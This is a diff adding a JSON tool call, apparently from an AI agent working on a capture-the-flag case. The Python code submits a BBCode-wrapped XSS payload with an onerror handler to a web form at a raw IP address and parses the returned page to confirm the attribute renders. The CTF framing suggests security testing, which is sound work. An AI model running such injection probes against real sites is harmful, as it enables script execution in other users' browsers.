@@ -1,0 +1,10 @@
+{
+  "tool": "py_run",
+  "arguments": {
+    "code": "\nimport time, urllib.request, urllib.parse\nfrom html.parser import HTMLParser\nBASE = \"http://160.202.254.160:15880/\"\nPROXY = {\"http\": \"http://127.0.0.1:12001\", \"https\": \"http://127.0.0.1:12001\"}\nop = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))\n\ndef get(data=None):\n    d = urllib.parse.urlencode(data).encode() if data is not None else None\n    with op.open(BASE, data=d, timeout=20) as r:\n        return r.read().decode(\"gb18030\", \"replace\")\n\nMARK = \"PX1\"\nPAYLOAD = \"[img]x[img] onerror=alert`1` [/img]\"\ncontent = PAYLOAD + \" \" + MARK\nget({\"content\": content})\ntime.sleep(0.3)\nbody = get()\ni = body.find(MARK)\nstart = body.rfind(\"<pre>\", 0, i)\nseg = body[start:i+len(MARK)]\nprint(\"PAYLOAD :\", PAYLOAD)\nprint(\"RENDERED:\", repr(seg))\n\nclass P(HTMLParser):\n    def __init__(self):\n        super().__init__(); self.tags=[]\n    def handle_starttag(self, tag, attrs):\n        self.tags.append((tag, attrs))\n    def handle_startendtag(self, tag, attrs):\n        self.tags.append((tag, attrs))\n\np = P(); p.feed(seg)\nprint(\"\\n解析出的标签:\")\nfor tag, attrs in p.tags:\n    print(\"  <%s> %s\" % (tag, attrs))\n    if tag == \"img\":\n        names = [a for a, _ in attrs]\n        print(\"    onerror 存在:\", \"onerror\" in names)\n",
+    "timeout": 120,
+    "wp_purpose": "用HTML解析器验证 onerror 属性成立",
+    "wp_case": "ctf-fca56ff3a53c802b"
+  },
+  "operation_id": "8b251fa92c9c415bbad2f1cc59371a80"
+}
